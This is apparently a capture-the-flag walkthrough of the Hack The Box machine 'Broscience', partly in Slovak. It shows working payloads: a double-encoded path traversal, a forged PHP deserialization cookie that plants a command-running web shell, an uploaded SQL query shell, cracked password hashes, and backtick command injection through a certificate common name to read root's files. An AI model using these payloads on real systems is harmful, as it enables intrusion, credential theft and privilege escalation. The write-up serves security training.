---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Broscience

## nmap

```
PORT    STATE SERVICE  VERSION                                                                                                                               
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)                                                                                         
| ssh-hostkey:                                                                                                                                               
|   3072 df17c6bab18222d91db5ebff5d3d2cb7 (RSA)                                                                                                              
|   256 3f8a56f8958faeafe3ae7eb880f679d2 (ECDSA)
|_  256 3c6575274ae2ef9391374cfdd9d46341 (ED25519)
80/tcp  open  http     Apache httpd 2.4.54
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Did not follow redirect to https://broscience.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))
| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Issuer: commonName=broscience.htb/organizationName=BroScience/countryName=AT 
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-07-14T19:48:36 
| Not valid after:  2023-07-14T19:48:36 
| MD5:   5328ddd62f3429d11d26ae8a68d86e0c
|_SHA-1: 20568d0d9e4109cde5a22021fe3f349c40d8d75b
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.54 (Debian)
|_ssl-date: TLS randomness does not represent time
|_http-title: BroScience : Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**80 -> 443**

## 443

komentovanie vyzaduje ucet, ucet vyzaduje potvrdzovaci email

We found **Administrator web account**

**https://broscience.htb/user.php?id=1**

administrator

Member since 4 years ago Email Address administrator@broscience.htb Total exercises posted 3 Total comments posted 1 Is activated Yes Is admin Yes

## /user.php

```
<!-- TODO: Avatars -->
```

## /

```
<!-- TODO: Search bar -->
```

## Subdomains

weird behavior, any host works.

## directory discovery

### /activate.php

The page have two errors, "Missing activation code." and "Invalid activation code.". That helped to identify the parameter name, which is **code**

https://broscience.htb/activate.php?code=7

### /includes/img.php

https://broscience.htb/includes/img.php?path=../login.php raises: "Error: attack detected"

https://broscience.htb/includes/img.php?path=test error in image (empty server response)

### /includes/img.php?path=..%252fupdate_user.php

* update hesla aktivovaneho uzivatele ->

## LFI

```
GET /includes/img.php?path=..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd HTTP/1.1
```

### db_connect

/includes/img.php?path=..%252fincludes%252fdb_connect.php

```
<?php
$db_host = "localhost";
$db_port = "5432";
$db_name = "broscience";
$db_user = "dbuser";
$db_pass = "RangeOfMotion%777";
$db_salt = "NaCl";

$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");

if (!$db_conn) {
    die("<b>Error</b>: Unable to connect to database");
}
?>
```

### includes/utils.php

There is a vulnerability that allows us to guess the correct activation code. As it is dependant on time.

```
<?php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time());
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}

// Source: https://stackoverflow.com/a/4420773 (Slightly adapted)
function rel_time($from, $to = null) {
    $to = (($to === null) ? (time()) : ($to));
    $to = ((is_int($to)) ? ($to) : (strtotime($to)));
    $from = ((is_int($from)) ? ($from) : (strtotime($from)));

    $units = array
    (
        "year"   => 29030400, // seconds in a year   (12 months)
        "month"  => 2419200,  // seconds in a month  (4 weeks)
        "week"   => 604800,   // seconds in a week   (7 days)
        "day"    => 86400,    // seconds in a day    (24 hours)
        "hour"   => 3600,     // seconds in an hour  (60 minutes)
        "minute" => 60,       // seconds in a minute (60 seconds)
        "second" => 1         // 1 second
    );

    $diff = abs($from - $to);

    if ($diff < 1) {
        return "Just now";
    }

    $suffix = (($from > $to) ? ("from now") : ("ago"));

    $unitCount = 0;
    $output = "";

    foreach($units as $unit => $mult)
        if($diff >= $mult && $unitCount < 1) {
            $unitCount += 1;
            // $and = (($mult != 1) ? ("") : ("and "));
            $and = "";
            $output .= ", ".$and.intval($diff / $mult)." ".$unit.((intval($diff / $mult) == 1) ? ("") : ("s"));
            $diff -= intval($diff / $mult) * $mult;
        }

    $output .= " ".$suffix;
    $output = substr($output, strlen(", "));

    return $output;
}

class UserPrefs {
    public $theme;

    public function __construct($theme = "light") {
		$this->theme = $theme;
    }
}

function get_theme() {
    if (isset($_SESSION['id'])) {
        if (!isset($_COOKIE['user-prefs'])) {
            $up_cookie = base64_encode(serialize(new UserPrefs()));
            setcookie('user-prefs', $up_cookie);
        } else {
            $up_cookie = $_COOKIE['user-prefs'];
        }
        $up = unserialize(base64_decode($up_cookie));
        return $up->theme;
    } else {
        return "light";
    }
}

function get_theme_class($theme = null) {
    if (!isset($theme)) {
        $theme = get_theme();
    }
    if (strcmp($theme, "light")) {
        return "uk-light";
    } else {
        return "uk-dark";
    }
}

function set_theme($val) {
    if (isset($_SESSION['id'])) {
        setcookie('user-prefs',base64_encode(serialize(new UserPrefs($val))));
    }
}

class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
?>
```

### create user + activate code

registration req:

```
POST /register.php HTTP/1.1
Host: mail.broscience.htb
Cookie: PHPSESSID=c9623dq6ej1ki3jvlebmde2s7h
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://mail.broscience.htb/register.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 87
Origin: https://mail.broscience.htb
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

username=andrej2&email=andrej2%40broscience.htb&password=andrej&password-confirm=andrej
```

**server responds time**. Calculate epoch https://www.epochconverter.com/

Then, feed epoch to

```
<?php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(1677851318);
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    echo $activation_code;
}
generate_activation_code();
```

and run it e.g. on https://onlinephp.io/

## RCE

Them, there is a cookie that uses unsecure serialisation.

RCE unserialize (log in, request index.php, use the cookie provided)

```
GET / HTTP/1.1
Host: broscience.htb
Cookie: user-prefs=TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czozMzoiZGF0YTosPD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7IjtzOjc6ImltZ1BhdGgiO3M6MjU6Ii92YXIvd3d3L2h0bWwvZXhwbG9pdC5waHAiO30%3d
```

Cookie je BASE64 encoded tohle:

```
O:15:"AvatarInterface":2:{s:3:"tmp";s:33:"data:,<?php system($_GET['cmd']);";s:7:"imgPath";s:25:"/var/www/html/exploit.php"
```

\--> creates /exploit.php?cmd=rce_here

## fine python revshell

https://github.com/infodox/python-pty-shells

### SQL shell

Upload with

```
/exploit.php?cmd=echo+PD9waHAKaW5jbHVkZV9vbmNlICdpbmNsdWRlcy9kYl9jb25uZWN0LnBocCc7CgokcmVzID0gcGdfcXVlcnkoJGRiX2Nvbm4sICRfR0VUWydxdWVyeSddKTsKLy8gdmFyIGR1bXAKZWNobyB2YXJfZHVtcChwZ19mZXRjaF9hbGwoJHJlcykpOy8v|base64+-d>mysql.php
```

`GET /mysql.php?query=select+*+from+users;`

Hashes from sql db

```
15657792073e8a843d4f91fc403454e1
13edad4932da9dbb57d9cd15b66ed104
bd3dad50e2d578ecba87d5fa15ca5f85
a7eed23a7be6fe0d765197b1027453fe
5d15340bded5b9395d5d14b9c21bc82b

salt: NaCl
```

```
13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym    
5d15340bded5b9395d5d14b9c21bc82b:NaCl:Aaronthehottest     
bd3dad50e2d578ecba87d5fa15ca5f85:NaCl:2applesplus2apples 
```

Correct pass for ssh bill: `iluvhorsesandgym`

```
bill@broscience:~$
cat user.txt
```

## root

[pspy64](https://github.com/DominicBreuker/pspy) returned this

 ![](https://s3.hedgedoc.org/demo/uploads/5dc3d202-d2a1-49f5-b83c-59b5341a7f12.png)

Root was running /opt/renew_cert.sh

Which contained

```
#!/bin/bash

if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then
    echo "Usage: $0 certificate.crt";
    exit 0;
fi

if [ -f $1 ]; then

    openssl x509 -in $1 -noout -checkend 86400 > /dev/null

    if [ $? -eq 0 ]; then
        echo "No need to renew yet.";
        exit 1;
    fi

    subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)

    country=$(echo $subject | grep -Eo 'C = .{2}')
    state=$(echo $subject | grep -Eo 'ST = .*,')
    locality=$(echo $subject | grep -Eo 'L = .*,')
    organization=$(echo $subject | grep -Eo 'O = .*,')
    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')
    commonName=$(echo $subject | grep -Eo 'CN = .*,?')
    emailAddress=$(openssl x509 -in $1 -noout -email)

    country=${country:4}
    state=$(echo ${state:5} | awk -F, '{print $1}')
    locality=$(echo ${locality:3} | awk -F, '{print $1}')
    organization=$(echo ${organization:4} | awk -F, '{print $1}')
    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')
    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')

    echo $subject;
    echo "";
    echo "Country     => $country";
    echo "State       => $state";
    echo "Locality    => $locality";
    echo "Org Name    => $organization";
    echo "Org Unit    => $organizationUnit";
    echo "Common Name => $commonName";
    echo "Email       => $emailAddress";

    echo -e "\nGenerating certificate...";
    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
    $state
    $locality
    $organization
    $organizationUnit
    $commonName
    $emailAddress
    " 2>/dev/null

    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
else
    echo "File doesn't exist"
    exit 1;
fi
```

We can abuse the `commonName` variable used in this command `/bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"`

If we set it to some bash expression it will be evalled.

The source of the variable is `commonName=$(echo $subject | grep -Eo 'CN = .*,?') ` ... `commonName=$(echo ${commonName:5} | awk -F, '{print $1}')`

So the first 5 chars of the commonName are stripped. (We initially thought that it only takes the first 5 chars of the commonName, this would be doable with some clever bash tricks: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge-v2 But that was not the case fortunately)

Now to generate the cert and setting it's expiry time to 1 day to bypass

```
openssl x509 -in $1 -noout -checkend 86400 > /dev/null

    if [ $? -eq 0 ]; then
        echo "No need to renew yet.";
        exit 1;
    fi
```

we used

`openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /home/bill/Certs/broscience.crt -days 1`

When asked for a common name of the cert, we entered

```
______`cat /root/root.txt>/tmp/.a/x.txt`
```

the point is that because the variable is in " (doublequotes) you can pass a command with backticks and it will execute

And waited for the job to run...

```
bill@broscience:/tmp/.a$ cat x.txt
```